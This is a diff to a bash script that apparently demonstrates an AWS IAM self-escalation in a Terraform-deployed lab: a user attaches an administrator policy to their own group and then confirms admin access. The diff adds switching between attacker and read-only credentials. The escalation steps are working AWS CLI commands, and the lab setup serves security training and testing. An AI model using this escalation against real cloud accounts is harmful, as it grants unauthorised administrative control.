@@ -11,6 +11,7 @@ export AWS_PAGER=""
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Dim color for command display
@@ -57,20 +58,54 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_secret_access_key')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
-echo -e "${GREEN}✓ Retrieved credentials for $PRIVESC_USER${NC}\n"
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
+
+echo -e "${GREEN}✓ Retrieved credentials for $PRIVESC_USER${NC}"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+echo "Region: $AWS_REGION"
+echo ""
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity
-echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
+echo -e "${YELLOW}Step 2: Verifying starting user identity${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $USER_IDENTITY"
@@ -79,15 +114,18 @@ if [[ ! $USER_IDENTITY == *"$PRIVESC_USER"* ]]; then
     echo -e "${RED}Error: Not running as $PRIVESC_USER${NC}"
     exit 1
 fi
-
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
-ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
-echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Confirmed identity as $PRIVESC_USER${NC}\n"
 
-# Step 3: Verify group membership
-echo -e "${YELLOW}Step 3: Verifying $PRIVESC_USER is a member of $TARGET_GROUP${NC}"
-show_cmd "Attacker" "aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text"
+# [OBSERVATION] Step 3: Get account ID and verify group membership
+echo -e "${YELLOW}Step 3: Getting account ID and verifying group membership${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
+ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+echo "Account ID: $ACCOUNT_ID"
+
+show_cmd "ReadOnly" "aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text"
 GROUP_MEMBERS=$(aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text)
 if [[ $GROUP_MEMBERS == *"$PRIVESC_USER"* ]]; then
     echo -e "${GREEN}✓ Confirmed: $PRIVESC_USER is a member of $TARGET_GROUP${NC}"
@@ -98,8 +136,9 @@ else
 fi
 echo ""
 
-# Step 4: Check current permissions (should be limited)
+# [EXPLOIT] Step 4: Check current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -110,8 +149,9 @@ else
 fi
 echo ""
 
-# Step 5: Perform the self-escalation - put admin policy on own group
+# [EXPLOIT] Step 5: Perform the self-escalation - put admin policy on own group
 echo -e "${YELLOW}Step 5: Self-escalation - Adding administrator policy to own group${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector..."
 echo "$PRIVESC_USER is adding an admin policy to $TARGET_GROUP (which they are a member of)"
 echo ""
@@ -141,8 +181,9 @@ aws iam put-group-policy \
 echo -e "${GREEN}✓ Successfully added administrator policy to group${NC}"
 echo -e "${GREEN}✓ $PRIVESC_USER now has administrator access through group membership!${NC}\n"
 
-# Step 6: Verify admin access
+# [OBSERVATION] Step 6: Verify admin access
 echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
+use_readonly_creds
 echo "The user $PRIVESC_USER should now have admin access via group membership..."
 echo ""
 
@@ -154,7 +195,7 @@ sleep 15
 echo "Testing admin permissions (listing IAM users)..."
 SUCCESS=false
 for i in {1..3}; do
-    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+    show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
     if aws iam list-users --max-items 3 --output table 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
         echo -e "${GREEN}✓ Confirmed administrator access through group policy!${NC}\n"
